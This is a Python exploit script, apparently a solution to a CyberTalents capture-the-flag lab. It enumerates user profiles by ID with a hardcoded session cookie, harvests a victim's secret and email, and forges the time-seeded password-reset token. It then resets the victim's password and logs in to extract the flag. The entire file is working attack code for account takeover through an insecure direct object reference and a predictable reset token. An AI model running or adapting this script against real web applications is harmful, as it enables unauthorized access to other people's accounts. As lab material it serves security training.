import requests
import random
from datetime import datetime, timedelta
import string
import re

url = 'http://wcomol2z7qrsm350m73p9p6tqzqwmdvwy825u1z5-web.cybertalentslabs.com/'

def retrive_secret_and_mail():
	for i in range(0,1000):
	
		x = requests.get(url+"profile/"+str(i),cookies={'session':'eyJ1c2VyX2lkIjo4MDF9.ZTPlsg.O3quLVqYb7yCUrb7nu3z_wLHcNo'})
		if x.text.split('\n')[52].replace(" ","").replace("<p>","").replace('</p>','') == 'MarielCalderwood':
			secret = x.text.split('\n')[60].replace(" ","").replace("<p>","").replace('</p>','') 
			mail = x.text.split('\n')[56].replace(" ","").replace("<p>","").replace('</p>','')
			return secret,mail

def generate_reset_token(secret):
    letters_and_digits = string.ascii_uppercase + string.digits

    current_time_minutes = int(datetime.now().timestamp() // 60)
    seed = secret + str(current_time_minutes)

    random.seed(seed)
    reset_token = ''.join(random.choice(letters_and_digits) for _ in range(32))

    return reset_token

def create_reset_token(mail):
	x = requests.post(url+'forgot_password',data={'email':f'{mail}'})

def reset_passwd(reset_token):
	x = requests.post(url+'reset_password/'+reset_token,data={'new_password':'pwd123'})

def get_flag(mail):
	x = requests.post(url+'/login',data={'email':f'{mail}','password':'pwd123'})
	return re.findall(r'\bflag{\w*}',x.text)[0]

if __name__ == '__main__':

	secret = retrive_secret_and_mail()[0]
	mail = retrive_secret_and_mail()[1]
	create_reset_token(mail)
	reset_token = generate_reset_token(secret)
	reset_passwd(reset_token)
	print(get_flag(mail))


